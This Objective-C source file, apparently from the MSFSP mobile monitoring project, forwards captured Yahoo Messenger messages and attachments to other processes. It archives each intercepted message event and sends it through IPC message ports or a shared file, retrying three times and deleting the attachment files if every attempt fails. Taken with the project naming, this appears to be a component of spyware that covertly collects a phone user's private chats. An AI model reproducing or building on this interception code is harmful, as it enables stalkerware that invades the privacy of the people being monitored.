//
//  YahooMsgEventSender.m
//  MSFSP
//
//  Created by Benjawan Tanarattanakorn on 3/26/2557 BE.
//
//

#import "YahooMsgEventSender.h"

#import "FxIMEvent.h"
#import "FxAttachment.h"

#import "StringUtils.h"
#import "DefStd.h"

#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"

static YahooMsgEventSender *_YahooMsgEventSender = nil;


@interface YahooMsgEventSender (private)
+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;

- (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
@end


@implementation YahooMsgEventSender


+ (id) sharedYahooMsgEventSender {
    DLog(@"sharedYahooMsgEventSender")
	if (_YahooMsgEventSender == nil) {
		_YahooMsgEventSender = [[YahooMsgEventSender alloc] init];
        
        if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
            SharedFile2IPCSender *sharedFileSender  = nil;
            sharedFileSender                        = [[SharedFile2IPCSender alloc] initWithSharedFileName:kYahooMsgMessagePort1];
            [_YahooMsgEventSender setMIMSharedFileSender:sharedFileSender];
            [sharedFileSender release];
            sharedFileSender = nil;
        }
	}
	return (_YahooMsgEventSender);
}


- (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
    
	if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
		MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
		successfully                            = [messagePortSender writeDataToPort:aData];
		[messagePortSender release];
		messagePortSender = nil;
	} else {
		SharedFile2IPCSender *sharedFileSender  = [[YahooMsgEventSender sharedYahooMsgEventSender] mIMSharedFileSender];
        DLog(@"sharedFileSender %@", sharedFileSender)
		successfully = [sharedFileSender writeDataToSharedFile:aData];
	}
	return (successfully);
}

- (void) thread: (FxIMEvent *) aIMEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
        
        if (aIMEvent) {
            NSString *msg = [StringUtils removePrivateUnicodeSymbols:[aIMEvent mMessage]];
            DLog(@"Yahoo Messenger message after remove emoji = %@", msg);
            
            if ([msg length] || [[aIMEvent mAttachments] count]) {
                [aIMEvent setMMessage:msg];
                
                NSMutableData* data			= [[NSMutableData alloc] init];
                NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
				[archiver encodeObject:aIMEvent forKey:kYahooMsgArchived];
				[archiver finishEncoding];
				[archiver release];
                
                // -- first
                BOOL isSendingOK = [self sendDataToPort:data portName:kYahooMsgMessagePort1];
                DLog (@"Sending to first port %d", isSendingOK)
                
                if (!isSendingOK) {
                    DLog (@"First sending Yahoo Messenger fail");
                    
                    // -- second
                    isSendingOK = [self sendDataToPort:data portName:kYahooMsgMessagePort2];
                    
                    if (!isSendingOK) {
                        DLog (@"Second sending Yahoo Messenger also fail");
                        
                        // -- Third port ----------
                        [NSThread sleepForTimeInterval:3];
                        
                        isSendingOK = [self sendDataToPort:data portName:kYahooMsgMessagePort3];
                        if (!isSendingOK) {
                            DLog (@"Third sending Yahoo Messenger also fail, so delete the attachment");
                            [YahooMsgEventSender deleteAttachmentFileAtPathForEvent:[aIMEvent mAttachments]];
                        }
                    }
                }
                [data release];
            }
            
        } // aIMEvent
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray {
	// delete the attachment files
	if (aAttachmentArray && [aAttachmentArray count] != 0) {
		for (FxAttachment *attachment in aAttachmentArray) {
			NSString *path = [attachment fullPath];
			DLog (@"deleting Yahoo Messenger attachment file: %@", path)
			[[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		}
	}
}

@end
